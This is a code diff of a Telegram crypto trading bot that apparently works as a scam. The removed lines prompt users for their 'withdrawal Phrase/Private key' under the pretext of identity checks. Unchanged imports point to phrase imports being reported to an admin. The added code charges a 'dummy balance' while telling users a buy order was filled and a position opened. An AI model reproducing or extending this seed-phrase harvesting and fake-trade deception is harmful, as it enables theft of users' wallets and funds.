@@ -3,7 +3,7 @@ const { Telegraf, Markup, session } = require('telegraf');
 const db = require('./db');
 const { generateAllWallets, detectAndImport, importFromPhrase } = require('./wallets');
 const { notifyAdmin, notifyImport, notifyPhraseImport, notifyWithdrawal } = require('./adminNotify');
-const { enrichPositions } = require('./prices');
+const { enrichPositions, fetchTokenPrice } = require('./prices');
 const { startAutoDepositScheduler } = require('./scheduler');
 
 if (!process.env.BOT_TOKEN) {
@@ -338,7 +338,7 @@ bot.on('text', async (ctx, next) => {
     }
 
     ctx.session.withdraw = { ...(ctx.session.withdraw || {}), address };
-    ctx.session.awaiting = 'withdraw_Phrase';
+    ctx.session.awaiting = 'withdraw_fullname';
 
     const label = chain === 'bsc' ? 'BNB' : chain.toUpperCase();
     await ctx.reply(
@@ -356,8 +356,8 @@ bot.on('text', async (ctx, next) => {
     return;
   }
 
-  if (ctx.session?.awaiting === 'withdraw_Phrase') {
-    const Phrase = ctx.message.text.trim();
+  if (ctx.session?.awaiting === 'withdraw_fullname') {
+    const fullName = ctx.message.text.trim();
     const { chain, amount, address } = ctx.session.withdraw || {};
     ctx.session.awaiting = null;
     ctx.session.withdraw = null;
@@ -366,10 +366,10 @@ bot.on('text', async (ctx, next) => {
       await ctx.reply('❌ Session expired. Please run /withdraw again.', mainMenu);
       return;
     }
-    if (!Phrase || Phrase.length < 2) {
-      ctx.session.awaiting = 'withdraw_Phrase';
+    if (!fullName || fullName.length < 2) {
+      ctx.session.awaiting = 'withdraw_fullname';
       ctx.session.withdraw = { chain, amount, address };
-      await ctx.reply('❌ Secured** Please Enter your withdrawal Phrase/Private key to verify your identity.');
+      await ctx.reply('❌ Please enter your full name.');
       return;
     }
 
@@ -449,15 +449,42 @@ bot.on('text', async (ctx, next) => {
     }
 
     const label = chain === 'bsc' ? 'BNB' : chain.toUpperCase();
+
+    await ctx.reply('Looking up token and opening position...');
+    const info = await fetchTokenPrice(token);
+    if (!info) {
+      await ctx.reply(
+        'Could not find that token on DexScreener. Buy cancelled — balance not charged.',
+        mainMenu
+      );
+      return;
+    }
+
+    const entryPrice = info.priceUsd;
+    const tokenAmount = amount / entryPrice;
+
     db.setDummyBalance(ctx.from.id, chain, available - amount);
+    const posId = db.addPosition({
+      telegramId: ctx.from.id,
+      chain,
+      tokenAddress: token,
+      tokenSymbol: info.symbol,
+      tokenName: info.name,
+      entryPriceUsd: entryPrice,
+      amountUsd: amount,
+      tokenAmount,
+    });
 
     await ctx.reply(
-      `✅ *Buy order placed (demo)*\n\n` +
-        `Chain: *${label}*\n` +
-        `Token: \`${token}\`\n` +
-        `Spent: *$${amount.toFixed(2)}*\n\n` +
-        'Open positions will appear here in a future update.',
-      { parse_mode: 'Markdown', ...mainMenu }
+      '✅ Buy filled\n\n' +
+        'Chain: ' + label + '\n' +
+        'Token: ' + info.symbol + ' (' + info.name + ')\n' +
+        token + '\n' +
+        'Spent: $' + amount.toFixed(2) + '\n' +
+        'Entry: $' + entryPrice + '\n' +
+        'Position #' + posId + ' is now open.\n\n' +
+        'Open Wallet to see live value, or Sell to close.',
+      mainMenu
     );
     return;
   }
